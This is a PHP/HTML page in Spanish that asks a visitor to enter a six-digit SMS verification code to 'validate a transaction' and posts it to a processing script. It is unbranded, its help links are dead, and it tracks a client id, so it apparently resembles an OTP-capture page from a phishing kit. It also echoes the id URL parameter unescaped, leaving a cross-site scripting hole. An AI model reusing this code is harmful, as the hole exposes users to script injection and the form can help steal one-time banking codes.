<?php 
$fechaActual = date('d/m/y');
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autenticación de Compra</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            margin: 0;
        }

        .details {
            margin-top: 30%;
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 400px;
        }

        img {
            width: 70%;
            margin-bottom: 20px;
        }

        input[type="text"] {
            width: 90%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            text-align: center;
            margin-top: 10px;
        }

        input[type="submit"] {
            color: white;
            background-color: #1c93d1;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 80%;
            height: 35px;
            margin-top: 10px;
        }

        input[type="submit"]:hover {
            background-color: gray;
        }

        .footer-links {
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="details">
        <img src="img/logo.png" alt="Logo">
        <h3>Vamos a validar tu transacción</h3>
        <p>Ingresa el código SMS que acabamos de enviar a tu número de celular.</p>
        <form action="process/process_otp.php" method="POST">
            <label for="txtOTP"><b>Código de verificación</b></label>
            <input type="hidden" name="cliente_id" value="<?php echo $_GET['id']; ?>"> <!-- Pasar cliente_id -->
            <input type="text" name="claveDinamica" placeholder="Clave dinámica" required minlength="6" maxlength="6" pattern="\d*" inputmode="numeric">            
            <input type="submit" value="ENVIAR">
        </form>
    </div>

    <div class="footer-links">
        <a href="#"><b>PEDIR OTRO CÓDIGO</b></a><br>
        <a href="#"><b>¿Necesitas ayuda?</b></a>
    </div>
</body>
</html>
